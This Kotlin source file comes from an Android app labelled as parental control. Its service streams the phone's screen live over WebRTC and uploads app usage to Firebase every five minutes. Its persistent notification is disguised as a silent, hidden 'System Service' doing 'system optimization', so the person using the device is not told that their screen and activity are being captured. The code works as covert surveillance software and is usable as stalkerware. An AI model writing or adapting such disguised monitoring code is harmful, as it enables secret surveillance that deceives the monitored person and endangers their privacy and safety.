package com.parentalcontrol.kidmonitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.*
import java.util.UUID

/**
 * Core monitoring service.
 * - Foreground service (silent notification)
 * - Starts WebRTC screen share via WebRTCKidClient (Supabase + P2P)
 * - Continues to write device info + app usage to Firebase RTDB
 * - Live screen is now handled entirely by WebRTC — no Firebase Storage needed
 */
class MonitorService : LifecycleService() {

    private lateinit var firebaseManager: FirebaseManager
    private lateinit var usageStatsHelper: UsageStatsHelper
    private var webRTCKidClient: WebRTCKidClient? = null

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var usageJob: Job? = null

    private val prefs by lazy { getSharedPreferences(SetupActivity.PREFS_NAME, MODE_PRIVATE) }
    private val deviceId: String by lazy {
        prefs.getString(SetupActivity.KEY_DEVICE_ID, null) ?: UUID.randomUUID().toString().also {
            prefs.edit().putString(SetupActivity.KEY_DEVICE_ID, it).apply()
        }
    }

    companion object {
        var isRunning = false
            private set

        private const val TAG = "MonitorService"
        private const val CHANNEL_ID = "monitor_channel"
        private const val NOTIF_ID = 1
        const val ACTION_START = "ACTION_START_MONITOR"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_DATA = "projection_data"

        fun startWithProjection(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, MonitorService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    // ─── Lifecycle ────────────────────────────────────────────────────
    override fun onCreate() {
        super.onCreate()
        isRunning = true
        firebaseManager = FirebaseManager(this, deviceId)
        usageStatsHelper = UsageStatsHelper(this)

        createNotificationChannel()

        // Android 10+: startForeground must include service type for MediaProjection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, buildNotification())
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if (intent?.action == ACTION_START) {
            val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra<Intent>(EXTRA_DATA)
            }

            if (resultCode == Activity.RESULT_OK && data != null) {
                startMonitoring(resultCode, data)
            } else {
                Log.e(TAG, "Missing projection data: resultCode=$resultCode")
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        usageJob?.cancel()
        serviceScope.cancel()
        webRTCKidClient?.stop()
        webRTCKidClient = null
        super.onDestroy()
    }

    // ─── Monitoring ───────────────────────────────────────────────────
    private fun startMonitoring(resultCode: Int, data: Intent) {
        // Register device & write online status to Firebase
        serviceScope.launch {
            try {
                firebaseManager.registerDevice(Build.MODEL, Build.MANUFACTURER)
                firebaseManager.writeStatus("WebRTC ready")
            } catch (e: Exception) {
                Log.e(TAG, "registerDevice: ${e.message}")
            }
        }

        // Start WebRTC — passes raw projection data directly to ScreenCapturerAndroid
        // (do NOT call getMediaProjection() here — ScreenCapturerAndroid handles it internally)
        webRTCKidClient = WebRTCKidClient(
            context = applicationContext,
            projectionData = data,
            deviceId = deviceId
        )
        webRTCKidClient!!.start()
        Log.d(TAG, "WebRTC client started for device $deviceId")

        // App usage stats loop — every 5 minutes
        usageJob = serviceScope.launch {
            while (isActive) {
                try {
                    val stats = usageStatsHelper.getUsageStats()
                    firebaseManager.uploadUsageStats(stats)
                    // Update lastSeen heartbeat
                    FirebaseDatabase.getInstance()
                        .getReference("devices/$deviceId/info/lastSeen")
                        .setValue(System.currentTimeMillis())
                } catch (e: Exception) {
                    Log.e(TAG, "Usage upload: ${e.message}")
                }
                delay(5 * 60 * 1000L) // 5 minutes
            }
        }
    }

    // ─── Notification ─────────────────────────────────────────────────
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false); setSound(null, null)
                enableLights(false); enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running system optimization")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setSilent(true)
            .build()
}
